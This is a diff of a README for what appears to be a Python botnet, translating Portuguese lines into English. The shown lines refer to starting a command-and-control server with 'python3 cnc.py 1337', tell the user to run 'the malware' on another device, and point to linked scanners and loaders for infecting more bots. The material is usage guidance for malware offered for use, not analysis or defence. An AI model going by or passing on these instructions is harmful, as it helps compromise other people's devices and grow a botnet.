@@ -36,7 +36,7 @@ python3 cnc.py 1337
 
 - Then run the malware on another device that supports python (if the target does not have python you can try to compile the malware)
 
-- Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots. OBS: não é possivel gerar um binario TOTALMENTE estático com python PURO!
+- Try using <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners and Loaders</a> to load more bots. NOTE: It is not possible to generate a FULLY static binario with PURE python!
 
 <br>
 
@@ -176,4 +176,4 @@ Command | Usage | Description
 
 ###Owner
 - **Discord: Cirqueira**
-- <a href="https://www.instagram.com/cirqueirax/">Meu instagram</a>
+- <a href="https://www.instagram.com/cirqueirax/">My instagram</a>
